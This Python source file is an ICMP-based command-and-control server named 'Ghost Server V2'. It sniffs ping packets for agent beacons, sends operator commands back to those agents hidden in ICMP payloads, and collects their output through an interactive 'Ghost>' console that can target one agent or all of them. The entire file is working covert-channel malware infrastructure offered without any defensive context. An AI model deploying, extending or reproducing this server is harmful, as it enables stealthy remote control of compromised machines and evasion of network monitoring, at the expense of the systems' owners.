# Author: Miller Swank
# Ghost Server V2

from scapy.all import *
import time
import os
import threading

# ======== Rich UI =========
from rich import print
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

# ======== Initializing data sets =========

COMMANDS = {}
ACTIVE_AGENTS = set()
AGENT_INFO = {}
RESULTS = {}
INACTIVITY_TIMEOUT = 120

lock = threading.Lock()

# ======== Helper functions ========

def get_next_agent_id():
    if not AGENT_INFO:
        return "001"

    used_ids = sorted(int(agent_id) for agent_id in AGENT_INFO.keys())
    next_id = 1
    for uid in used_ids:
        if uid == next_id:
            next_id += 1
        else:
            break

    if next_id > 999:
        raise Exception("Maximum number of agents reached")

    return f"{next_id:03d}"

def find_agent_by_identifier(identifier):
    with lock:
        if identifier in ACTIVE_AGENTS:
            return identifier

        for aid, info in AGENT_INFO.items():
            if not info:
                continue
            if identifier == info.get("ip"):
                return aid
    return None

# ======== Main functionality =========

def handle_packet(pkt):
    try:
        if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
            payload = pkt[Raw].load.decode(errors="ignore")
            if "|" not in payload:
                return

            msg_type, client_ip, result = payload.split("|", 2)

            if msg_type not in ("BEACON", "RESULT"):
                return

            src = client_ip

            agent_id = None
            for aid, info in AGENT_INFO.items():
                if info["ip"] == src:
                    agent_id = aid
                    break

            if not agent_id:
                agent_id = get_next_agent_id()
                AGENT_INFO[agent_id] = {"ip": src, "last_seen": time.time()}
                ACTIVE_AGENTS.add(agent_id)


            else:
                AGENT_INFO[agent_id]["last_seen"] = time.time()

            if msg_type == "BEACON":
                queue = COMMANDS.get(agent_id)
                if not queue:
                    return

                task = queue.pop(0)
                send(IP(dst=src)/ICMP(type=8)/task.encode(), verbose=0)

                if not queue:
                    COMMANDS.pop(agent_id, None)

            elif msg_type == "RESULT":
                RESULTS.setdefault(agent_id, []).append((time.time(), result))

    except Exception as e:
        console.print(f"[bold red][!] Handler exception:[/bold red] {e}")

# ======== Operator Console =========

def operator_console():

    console.print("[bold cyan][*] Operator console ready.[/bold cyan] Type 'help'")

    while True:
        try:
            cmd_line = console.input("[bold red]Ghost> [/bold red]").strip()
        except (EOFError, KeyboardInterrupt):
            console.print("\n[red][*] Exiting.[/red]")
            os._exit(0)

        if not cmd_line:
            continue

        parts = cmd_line.split(" ", 2)
        cmd = parts[0].lower()

        if cmd == "help":
            console.print("[bold cyan]Commands:[/bold cyan]")
            console.print("[bright_yellow]  list                         - List active agents (shows id, ip, age)[/bright_yellow]")
            console.print("[bright_yellow]  info <id|ip>                 - Show detailed info for an agent[/bright_yellow]")
            console.print("[bright_yellow]  task <id|ip list> <cmd>      - Queue a command for a list of agents separated by a comma (no space)[/bright_yellow]")
            console.print("[bright_yellow]  task all <cmd>               - Queue a command for all active agents[/bright_yellow]")
            console.print("[bright_yellow]  results <id|ip>              - Show results from an agent[/bright_yellow]")
            console.print("[bright_yellow]  exit                         - Stop the server[/bright_yellow]")
            continue

        if cmd == "list":
            with lock:
                now = time.time()

                stale = []
                for agent_id in list(ACTIVE_AGENTS):
                    info = AGENT_INFO.get(agent_id)
                    if not info or now - info["last_seen"] > INACTIVITY_TIMEOUT:
                        stale.append(agent_id)

                for agent_id in stale:
                    ACTIVE_AGENTS.discard(agent_id)
                    COMMANDS.pop(agent_id, None)
                    RESULTS.pop(agent_id, None)
                    AGENT_INFO.pop(agent_id, None)

                if not ACTIVE_AGENTS:
                    console.print("[yellow]No active agents.[/yellow]")
                else:
                    table = Table(title="Active agents ({len(ACTIVE_AGENTS)})")

                    table.add_column("ID", style="green")
                    table.add_column("IP", style="yellow")
                    table.add_column("Age (s)", style="magenta")

                    for agent_id in sorted(ACTIVE_AGENTS):
                        info = AGENT_INFO.get(agent_id)
                        if not info:
                            continue

                        ip = info.get("ip", "unknown")
                        age = int(now - info["last_seen"])

                        color = "green" if age < 30 else "yellow" if age < 60 else "red"
                        table.add_row(agent_id, ip, f"[{color}]{age}[/{color}]")

                    console.print(table)

            continue

        if cmd == "info":
            if len(parts) < 2:
                console.print("[red]Usage: info <id|ip>[/red]")
                continue

            agent_id = find_agent_by_identifier(parts[1])
            if not agent_id:
                console.print("[red]No such agent.[/red]")
                continue

            with lock:
                info = AGENT_INFO.get(agent_id, {})
                age = int(time.time() - info["last_seen"])

                console.print(Panel(
                    f"[cyan]ID:[/cyan] {agent_id}\n"
                    f"[yellow]IP:[/yellow] {info.get('ip')}\n"
                    f"[magenta]Last seen:[/magenta] {age}s\n"
                    f"Queued: {len(COMMANDS.get(agent_id, []))}\n"
                    f"Results: {len(RESULTS.get(agent_id, []))}",
                    title="Agent Info"
                ))

            continue

        if cmd == "task":
            if len(parts) < 3:
                console.print("[red]Usage: task <id|ip list> <cmd>[/red]")
                continue

            identifiers = parts[1].split(",")
            command_text = parts[2]

            for identifier in identifiers:
                if identifier == "all":
                    with lock:
                        for agent_id in ACTIVE_AGENTS:
                            COMMANDS.setdefault(agent_id, []).append(command_text)
                else:
                    agent_id = find_agent_by_identifier(identifier)
                    if not agent_id:
                        console.print(f"[red]No agent:[/red] {identifier}")
                        continue

                    with lock:
                        COMMANDS.setdefault(agent_id, []).append(command_text)
                        ip = AGENT_INFO.get(agent_id, {}).get("ip")

                        console.print(f"[cyan][+] Task queued[/cyan] → "
                                      f"{agent_id} ({ip})")

            continue

        if cmd == "results":
            if len(parts) < 2:
                console.print("[red]Usage: results <id|ip>[/red]")
                continue

            agent_id = find_agent_by_identifier(parts[1])
            if not agent_id:
                console.print("[red]No such agent.[/red]")
                continue

            with lock:
                chunks = sorted(RESULTS.get(agent_id, []))
                if not chunks:
                    console.print("[yellow]No results.[/yellow]")
                    continue

                full_result = "\n".join(chunk for _, chunk in chunks)

                console.print(Panel(
                    full_result,
                    title=f"Results from {agent_id}",
                    border_style="blue"
                ))

                RESULTS[agent_id] = []

            continue

        if cmd in ("quit", "exit"):
            console.print("[red][*] Shutting down.[/red]")
            os._exit(0)

        console.print("[red]Unknown command[/red]")

# ======== Main =========

def main():

    banner = r"""
   ________               __
  / ____/ /_  ____  _____/ /_
 / / __/ __ \/ __ \/ ___/ __/
/ /_/ / / / / /_/ (__  ) /_
\____/_/ /_/\____/____/\__/  
    """

    console.print(Panel.fit(
        f"[red]{banner}[/red]",
        border_style="bright_red"
    ))

    threading.Thread(target=operator_console, daemon=True).start()
    sniff(filter="icmp", prn=handle_packet)

if __name__ == "__main__":
    main()
